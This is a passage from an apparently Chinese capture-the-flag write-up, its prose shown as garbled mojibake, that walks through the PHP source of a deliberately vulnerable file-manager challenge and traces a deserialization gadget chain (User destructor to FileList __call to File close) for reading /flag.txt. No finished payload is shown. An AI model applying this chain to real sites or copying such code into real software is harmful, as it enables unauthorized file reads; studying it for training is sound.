TB&#x27;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$size</span> &gt;= <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-variable">$size</span> /= <span class="hljs-number">1024</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$size</span>, <span class="hljs-number">2</span>).<span class="hljs-variable">$units</span>[<span class="hljs-variable">$i</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileList</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Name</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Size</span>();<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//download.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>, <span class="hljs-title function_ invoke__">getcwd</span>() . <span class="hljs-string">&quot;:/etc:/tmp&quot;</span>);<br><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;flag&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<span class="hljs-comment">//æ³¨æ„è¿™é‡Œæˆ‘ä»¬æ— æ³•è®©æ–‡ä»¶åä¸­åŒ…å«flag</span><br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>);<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not exist&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//delate.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>    <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">detele</span>();<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;File not exist&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç½‘ç›˜ç®¡ç†ç•Œé¢æ˜¯<code>index.php</code>ï¼Œæˆ‘ä»¬ä»è¯¥æ–‡ä»¶å¼€å§‹çœ‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileList</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Name</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Size</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>new</code>äº†ä¸€ä¸ª<code>FileList</code>ç±»ï¼Œæˆ‘ä»¬è·Ÿè¸ªåˆ°è¯¥ç±»ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$filenames</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$path</span>);<br><br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filenames</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br>            <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$path</span> . <span class="hljs-variable">$filename</span>);<br>            <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;files, <span class="hljs-variable">$file</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()] = <span class="hljs-keyword">array</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&#x27;</span>;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å—çš„çœ‹çš„å¤´éƒ½å¤§äº†ã€‚ã€‚</p><p><code>__call</code>å¼„äº†ä¸ªå¤šç»´æ•°ç»„å‡ºæ¥ï¼š<code>results[$file-&gt;name()][$func]</code>ï¼Œå³<code>results[æ–‡ä»¶å][å‡½æ•°å]=[è°ƒç”¨ç»“æœ]</code>ã€‚</p><p>éå†filesæ•°ç»„ï¼Œå¯¹æ¯ä¸€ä¸ªfileå˜é‡æ‰§è¡Œä¸€æ¬¡$funcï¼Œç„¶åå°†ç»“æœå­˜è¿›$resultså¤šç»´æ•°ç»„ï¼Œæ¥ä¸‹æ¥çš„<code>_destruct</code>å‡½æ•°ä¼šå°†<code>FileList</code>å¯¹è±¡çš„funcså˜é‡å’Œresultsæ•°ç»„ä¸­çš„å†…å®¹ä»¥HTMLè¡¨æ ¼çš„å½¢å¼è¾“å‡ºåœ¨index.phpä¸Šï¼ˆæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œindex.phpé‡Œåˆ›å»ºäº†ä¸€ä¸ªFileListå¯¹è±¡ï¼Œåœ¨è„šæœ¬æ‰§è¡Œå®Œæ¯•åè§¦å‘<code>_destruct</code>ï¼‰ã€‚</p><p><code>__destruct()</code>å°±æ˜¯æŠŠä¸Šé¢çš„å¤šç»´æ•°ç»„éå†ç„¶åè¾“å‡ºã€‚</p><p><code>new</code>äº†ä¸€ä¸ª<code>File</code>ç±»ï¼Œæˆ‘ä»¬è·Ÿè¸ªåˆ°è¯¥ç±»ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">size</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        <span class="hljs-variable">$units</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; B&#x27;</span>, <span class="hljs-string">&#x27; KB&#x27;</span>, <span class="hljs-string">&#x27; MB&#x27;</span>, <span class="hljs-string">&#x27; GB&#x27;</span>, <span class="hljs-string">&#x27; TB&#x27;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$size</span> &gt;= <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-variable">$size</span> /= <span class="hljs-number">1024</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$size</span>, <span class="hljs-number">2</span>).<span class="hljs-variable">$units</span>[<span class="hljs-variable">$i</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™ä¸ª<code>close()</code>å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾æˆ‘ä»¬å¯ä»¥ä¾é <code> return file_get_contents($this-&gt;filename)</code>å»è¯»<code>flag.php</code>æˆ–<code>flag/txt</code>ä¹‹ç±»çš„æ–‡ä»¶ï¼Œ(è¿™é“é¢˜æ˜¯è¯»<code>flag.txt</code>ï¼Œä¸ºä»€ä¹ˆè¯»è¿™ä¸ªæ–‡ä»¶å¯ä»¥çœ‹<code>download.php</code>çš„è¿‡æ»¤å†…å®¹ã€‚)</p><p>ä½†æ³¨æ„è¿™ä¸ªå‡½æ•°æ˜¯æ²¡å›æ˜¾çš„ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•æŠŠè¯»åˆ°çš„ç»“æœå›æ˜¾å‡ºæ¥ï¼Œè¿™æ—¶æƒ³åˆ°äº†åˆšæ‰<code>FileList</code>ä¸‹çš„<code>__destruct()</code>å‡½æ•°ã€‚ä½†ä»<code>Filelist</code>ç±»ä¸‹æ˜¯æ²¡æ³•ç›´æ¥è§¦å‘<code>__call</code>æ–¹æ³•å’Œ<code>close()</code>çš„ï¼Œä¸è¿‡ï¼š</p><p><code>User</code>ç±»ä¸‹å­˜åœ¨<code>_destruct()</code>æ–¹æ³•;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br><span class="hljs-comment">// ä¹Ÿå°±æ˜¯è¯´å¦‚æœdb=FileListç±»çš„å®ä¾‹ï¼Œå°±å˜æˆäº†FileList-&gt;close();</span><br></code></pre></td></tr></table></figure><p>å½“æ‰§è¡Œ<code>FileList-&gt;close()</code>æ—¶ï¼Œå› ä¸ºFileListç±»ä¸­æ²¡æœ‰<code>close()</code>è¿™ä¸ªæ–¹æ³•æ‰€ä»¥è°ƒç”¨<code>FileList</code>-&gt;<code>_call()</code>ä»è€Œéå†å…¨æ–‡ä»¶æ‰¾<code>close()</code>æ–¹æ³•ã€‚æ‰¾åˆ°äº†<code>File-&gt;close()</code>å°±æ‰§è¡Œäº†è¯»å–æ–‡ä»¶å†…å®¹çš„æ“ä½œ<code>file_get_contents($filename)</code>å¹¶ç»™ä»–çš„ç»“æœè¿”å›<code>FileList-&gt;$results</code>,æœ€å<code>FileList-&gt;_destruct()</code>æ–¹æ³•è¾“å‡ºäº†è¿™ä¸ªç»“æœã€‚</p><p><code>Userä¸­çš„__destruct</code> &#x3D; &gt; <code>FileList-&gt;close</code> &#x3D; &gt; <code>Filelist-&gt;__call(&#39;close&#39;)</code> &#x3D;&gt;<code>File-&gt;close(&#39;/flag.txt&#39;)</code>&#x3D; &gt;<code>$results=file_get_contents(&#39;flag.txt&#39;)</code>&#x3D;&gt;<code>FileList-&gt;_destruct()</code> &#x3D;&gt; <code>echo $result</code>ã€‚</p><p>å†æ¢³ç†ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br><span class="hljs-comment">//è¿™æ—¶æˆ‘ä»¬å¯ä»¥ä»¤db = new Filelist()ï¼Œå˜æˆ$this-&gt;new Filelist -&gt;close();</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br><span class="hljs-comment">//funcä¸ºclose()ï¼Œä»¤$this-&gt;files[]=new File();å»è°ƒç”¨Fileä¸­çš„close()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br><span class="hljs-comment">//ä»¤$this-&gt;filename = /flag.txt,ç»“æœè¢«å­˜åˆ°$resultsè¿™ä¸ªå¤šç»´æ•°ç»„ä¸­</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;<br>        <span 